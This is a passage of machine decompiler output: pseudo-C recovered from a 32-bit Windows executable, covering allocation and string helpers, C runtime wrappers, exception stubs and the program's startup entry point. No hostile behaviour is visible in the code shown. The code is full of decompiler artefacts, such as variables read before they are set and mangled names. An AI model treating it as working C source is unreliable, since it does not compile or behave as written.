int32_t function_4074a4(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4074a4
    function_4076c8((int32_t)&g54);
    int32_t v1 = 580; // bp-12, 0x4074b0
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(580); // 0x4074b5
    int32_t v3; // 0x4074a4
    *(int32_t *)(v3 - 16) = v2;
    int32_t * v4 = (int32_t *)(v3 - 4); // 0x4074c0
    *v4 = 0;
    int32_t v5; // bp-8, 0x4074a4
    int32_t * v6 = &v5; // 0x4074c6
    int32_t v7 = 0; // 0x4074c6
    if (v2 != 0) {
        int32_t v8 = *(int32_t *)(v3 + 20); // 0x4074c8
        v1 = v8;
        v7 = function_407527(v8);
        v6 = &v1;
    }
    int32_t v9 = (int32_t)v6;
    *(int32_t *)(v9 - 4) = *(int32_t *)(v3 + 16);
    *v4 = -1;
    *(int32_t *)(v9 - 8) = *(int32_t *)(v3 + 12);
    *(int32_t *)(v9 - 12) = *(int32_t *)(v3 + 8);
    int32_t v10 = function_406b8e((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4074e5
    g43 = v10;
    if (v10 == 0) {
        // 0x407509
        *(int32_t *)(v9 - 16) = 8;
        int32_t result = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g54); // 0x40750b
        *(int32_t *)result = 1;
        *(int32_t *)(result + 4) = v7;
        // 0x40751a
        __writefsdword(0, *(int32_t *)(v3 - 12));
        return result;
    }
    // 0x4074f3
    if (v7 != 0) {
        // 0x4074f7
        function_407572();
        *(int32_t *)(v9 - 16) = v7;
        _3f__3f_3_40_YAXPAX_40_Z(&g54);
    }
    // 0x40751a
    __writefsdword(0, *(int32_t *)(v3 - 12));
    return 0;
}

// Address range: 0x407527 - 0x407572
int32_t function_407527(int32_t a1) {
    // 0x407527
    int32_t result; // 0x407527
    *(int32_t *)(result + 4) = -1;
    *(int32_t *)(result + 308) = -1;
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result + 312); // 0x407540
    *v1 = 0;
    *(int32_t *)(result + 316) = 0;
    if (a1 != 0) {
        char * str = (char *)a1; // 0x40754f
        int32_t str2 = _3f__3f_2_40_YAPAXI_40_Z(strlen(str) + 1); // 0x407556
        *v1 = str2;
        strcpy((char *)str2, str);
    }
    // 0x40756b
    return result;
}

// Address range: 0x407572 - 0x4075ad
int32_t function_407572(void) {
    // 0x407572
    int32_t v1; // 0x407572
    int32_t * v2 = (int32_t *)(v1 + 312); // 0x407576
    int32_t v3 = *v2; // 0x407576
    if (v3 != 0) {
        // 0x407586
        _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v3);
    }
    // 0x40758d
    *v2 = 0;
    int32_t * v4 = (int32_t *)(v1 + 316); // 0x407590
    int32_t v5 = *v4; // 0x407590
    int32_t result = 0; // 0x40759e
    if (v5 != 0) {
        // 0x4075a0
        result = _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v5);
    }
    // 0x4075a7
    *v4 = 0;
    return result;
}

// Address range: 0x4075ad - 0x4075c4
int32_t function_4075ad(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4075ad
    return function_4074a4(a1, a2, 3, a3);
}

// Address range: 0x4075c4 - 0x407603
int32_t function_4075c4(int32_t a1, int32_t a2, int32_t * a3) {
    int32_t v1 = (int32_t)a3;
    *a3 = 0;
    *(char *)(v1 + 4) = 0;
    *(int32_t *)(v1 + 296) = 0;
    if (a1 == 0) {
        int32_t result = 0x10000;
        g43 = result;
        return result;
    }
    int32_t result2 = 0x80000; // 0x4075e7
    if (*(int32_t *)a1 == 1) {
        // 0x4075f0
        result2 = function_406c40(a2, v1, (int32_t)&g54);
    }
    // 0x4075fd
    g43 = result2;
    return result2;
}

// Address range: 0x407603 - 0x40763d
int32_t function_407603(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407603
    if (a1 == 0) {
        int32_t result = 0x10000;
        g43 = result;
        return result;
    }
    int32_t result2 = 0x80000; // 0x407617
    if (*(int32_t *)a1 == 1) {
        // 0x407620
        int32_t v1; // 0x407603
        result2 = function_407136(a2, a3, a4, a5, v1, (int32_t)&g54);
    }
    // 0x407636
    g43 = result2;
    return result2;
}

// Address range: 0x40763d - 0x407656
int32_t function_40763d(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40763d
    return function_407603(a1, a2, a3, 0, 2);
}

// Address range: 0x407656 - 0x4076a8
int32_t function_407656(int32_t a1) {
    // 0x407656
    int32_t result; // 0x407656
    if (a1 == 0) {
        // 0x407670
        result = 0x10000;
        g43 = result;
        return result;
    }
    int32_t * v1 = (int32_t *)a1; // 0x407666
    if (*v1 != 1) {
        // 0x407670
        result = 0x80000;
        g43 = result;
        return result;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x407678
    g43 = function_40747b();
    if (v2 != 0) {
        // 0x40768b
        function_407572();
        _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v2);
    }
    // 0x407699
    _3f__3f_3_40_YAXPAX_40_Z(v1);
    return g43;
}

// Address range: 0x4076a8 - 0x4076ae
char * function_4076a8(char * dest, char * src) {
    // 0x4076a8
    return strcpy(dest, src);
}

// Address range: 0x4076ae - 0x4076b4
int32_t * function_4076ae(int32_t * s, int32_t c, int32_t n) {
    // 0x4076ae
    return memset(s, c, n);
}

// Address range: 0x4076b4 - 0x4076ba
int32_t function_4076b4(char * s) {
    // 0x4076b4
    return strlen(s);
}

// Address range: 0x4076c0 - 0x4076c6
int32_t function_4076c0(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC) {
    // 0x4076c0
    return __CxxFrameHandler(pExcept, pRN, pContext, pDC);
}

// Address range: 0x4076c8 - 0x4076e7
int32_t function_4076c8(int32_t result) {
    int32_t v1 = __readfsdword(0); // bp-12, 0x4076d1
    __writefsdword(0, (int32_t)&v1);
    return result;
}

// Address range: 0x4076e8 - 0x4076ee
// Demangled:     void __cdecl operator delete(void *)
int32_t ??3@YAXPAX@Z(int32_t * a1) {
    // 0x4076e8
    return _3f__3f_3_40_YAXPAX_40_Z(a1);
}

// Address range: 0x4076ee - 0x4076f4
int32_t function_4076ee(int32_t * s1, int32_t * s2, int32_t n) {
    // 0x4076ee
    return memcmp(s1, s2, n);
}

// Address range: 0x4076f4 - 0x4076fa
int32_t function_4076f4(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher) {
    // 0x4076f4
    return _except_handler3(exception_record, registration, context, dispatcher);
}

// Address range: 0x4076fa - 0x407700
void function_4076fa(int32_t xr, int32_t stop) {
    // 0x4076fa
    _local_unwind2(xr, stop);
}

// Address range: 0x407700 - 0x407706
int32_t function_407700(int32_t a1) {
    // 0x407700
    return _3f__3f_2_40_YAPAXI_40_Z(a1);
}

// Address range: 0x407706 - 0x40770c
int32_t * function_407706(int32_t * dest, int32_t * src, int32_t n) {
    // 0x407706
    return memcpy(dest, src, n);
}

// Address range: 0x407710 - 0x40773f
int32_t function_407710(int32_t result) {
    // 0x407710
    int32_t v1; // 0x407710
    int32_t v2 = &v1; // 0x407716
    int32_t v3 = v2; // 0x40771a
    int32_t v4; // 0x407710
    if ((uint32_t)v4 < 0x1000) {
        // 0x407730
        int32_t v5; // 0x407710
        *(int32_t *)(-4 - v5 + v2) = result;
        return result;
    }
    v3 -= 0x1000;
    int32_t v6; // 0x407710
    int32_t v7 = v6 - 0x1000; // 0x407722
    while (v7 >= 0x1000) {
        // 0x40771c
        v3 -= 0x1000;
        v7 -= 0x1000;
    }
    // 0x407730
    *(int32_t *)(-4 - v7 + v3) = result;
    return result;
}

// Address range: 0x407740 - 0x407746
int32_t function_407740(char * s1, char * s2) {
    // 0x407740
    return strcmp(s1, s2);
}

// Address range: 0x407746 - 0x40774c
int32_t function_407746(int32_t * a1) {
    // 0x407746
    return _3f__3f_0exception_40__40_QAE_40_ABV0_40__40_Z(a1);
}

// Address range: 0x407768 - 0x40776e
int32_t function_407768(void) {
    // 0x407768
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x40776e - 0x407774
void function_40776e(int32_t * pExceptionObject, int32_t * pThrowInfo) {
    // 0x40776e
    _CxxThrowException(pExceptionObject, pThrowInfo);
}

// Address range: 0x4077b4 - 0x4077ba
char * function_4077b4(char * dest, char * src) {
    // 0x4077b4
    return strcat(dest, src);
}

// Address range: 0x4077ba - 0x4078f8
int32_t entry_point(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x4077cf
    __writefsdword(0, (int32_t)&v1);
    __set_app_type(2);
    g48 = -1;
    g49 = -1;
    *__p__fmode() = g47;
    *__p__commode() = g46;
    g50 = *(int32_t *)*(int32_t *)0x4081b8;
    function_40793f();
    if (g26 == 0) {
        // 0x407831
        __setusermatherr(0x40793c);
    }
    // 0x40783d
    __setdefaultprecision();
    _initterm((void (**)())&g20, (void (**)())&g21);
    int32_t v2 = g45; // bp-112, 0x407856
    int32_t v3; // bp-100, 0x4077ba
    int32_t v4; // bp-104, 0x4077ba
    int32_t v5; // bp-116, 0x4077ba
    __getmainargs(&v3, (char ***)&v5, (char ***)&v4, g44, &v2);
    _initterm((void (**)())&g18, (void (**)())&g19);
    int32_t v6 = *(int32_t *)*(int32_t *)0x4081a8; // 0x40788c
    unsigned char v7 = *(char *)v6; // 0x407891
    int32_t v8 = v6; // 0x407894
    char v9; // 0x4077ba
    int32_t v10; // 0x4077ba
    int32_t v11; // 0x4077ba
    if (v7 != 34) {
        char v12 = v7; // 0x4078d3
        int32_t v13 = v6; // 0x4078d3
        if (v7 >= 33) {
            int32_t v14 = v6 + 1;
            unsigned char v15 = *(char *)v14;
            v12 = v15;
            v13 = v14;
            int32_t v16 = v14; // 0x4078d3
            while (v15 >= 33) {
                // 0x4078d0
                v14 = v16 + 1;
                v15 = *(char *)v14;
                v12 = v15;
                v13 = v14;
                v16 = v14;
            }
        }
        // 0x4078ad
        v9 = v12;
        v11 = v13;
        goto lab_0x4078ad;
    } else {
        v8++;
        char v17 = *(char *)v8; // 0x40789a
        while (v17 != 0 == (v17 != 34)) {
            // 0x407896
            v8++;
            v17 = *(char *)v8;
        }
        // 0x4078a4
        v10 = v8;
        v9 = v17;
        v11 = v8;
        if (v17 != 34) {
            goto lab_0x4078ad;
        } else {
            goto lab_0x4078a9;
        }
    }
  lab_0x4078ad:
    // 0x4078ad
    v10 = v11;
    if (v9 >= 33) {
        // 0x4078b7
        int32_t lpStartupInfo; // bp-96, 0x4077ba
        GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
        int32_t * moduleHandle = GetModuleHandleA(NULL); // 0x4078e2
        exit(function_401fe7((int32_t)moduleHandle));
        // UNREACHABLE
    }
    goto lab_0x4078a9;
  lab_0x4078a9:;
    int32_t v18 = v10 + 1; // 0x4078a9
    v9 = *(char *)v18;
    v11 = v18;
    goto lab_0x4078ad;
}

// Address range: 0x4078f8 - 0x40790c
int32_t function_4078f8(void) {
    // 0x4078f8
    int32_t v1; // 0x4078f8
    int32_t * v2 = (int32_t *)*(int32_t *)(v1 - 20); // 0x4078fb
    int32_t v3 = *(int32_t *)*v2; // 0x4078fd
    *(int32_t *)(v1 - 120) = v3;
    return _XcptFilter(v3, v2);
}

// Address range: 0x407918 - 0x40791e
// Demangled:     public: virtual __thiscall type_info::~type_info(void)
int32_t ??1type_info@@UAE@XZ(void) {
    // 0x407918
    return _3f__3f_1type_info_40__40_UAE_40_XZ();
}

// Address range: 0x40791e - 0x407924
int32_t function_40791e(int32_t xcptnum, int32_t * pxcptinfoptrs) {
    // 0x40791e
    return _XcptFilter(xcptnum, pxcptinfoptrs);
}

// Address range: 0x407924 - 0x40792a
void function_407924(void (**First)(), void (**Last)()) {
    // 0x407924
    _initterm(First, Last);
}

// Address range: 0x40793c - 0x40793f
int32_t function_40793c(void) {
    // 0x40793c
    return 0;
}

// Address range: 0x40793f - 0x407940
int32_t function_40793f(void) {
    // 0x40793f
    int32_t result; // 0x40793f
    return result;
}

// Address range: 0x407940 - 0x407946
int32_t __controlfp(int32_t NewValue, int32_t Mask) {
    // 0x407940
    return _controlfp(NewValue, Mask);
}

// Address range: 0x407950 - 0x40795b
int32_t function_407950(void) {
    // 0x407950
    return ??1?$_Mpunct@D@std@@MAE@XZ();
}

// Address range: 0x40795b - 0x407966
int32_t function_40795b(void) {
    // 0x40795b
    return ??1?$_Mpunct@D@std@@MAE@XZ();
}

// Address range: 0x407966 - 0x407970
int32_t function_407966(void) {
    // 0x407966
    return __CxxFrameHandler(&g54, &g54, &g54, &g54);
}

// Address range: 0x407970 - 0x40797b
int32_t function_407970(void) {
    // 0x407970
    return ??1?$_Mpunct@D@std@@MAE@XZ();
}

// Address range: 0x40797b - 0x407986
int32_t function_40797b(void) {
    // 0x40797b
    return ??1?$_Mpunct@D@std@@MAE@XZ();
}

// Address range: 0x407986 - 0x407991
int32_t function_407986(void) {
    // 0x407986
    return ??1?$_Mpunct@D@std@@MAE@XZ2();
}

// Address range: 0x407991 - 0x40799b
int32_t function_407991(void) {
    // 0x407991
    return __CxxFrameHandler(&g54, &g54, &g54, &g54);
}

// Address range: 0x40799c - 0x4079a6
int32_t function_40799c(void) {
    // 0x40799c
    int32_t v1; // 0x40799c
    return _3f__3f_3_40_YAXPAX_40_Z((int32_t *)*(int32_t *)(v1 - 16));
}

// Address range: 0x4079a6 - 0x4079b0
int32_t function_4079a6(void) {
    // 0x4079a6
    return __CxxFrameHandler(&g54, &g54, &g54, &g54);
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f__Gtype_info_40__40_UAEPAXI_40_Z(int32_t a1);
// __int64 __allmul(__int64 a, __int64 b);
// int32_t __setdefaultprecision(void);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (6.0)
// Detected functions: 150

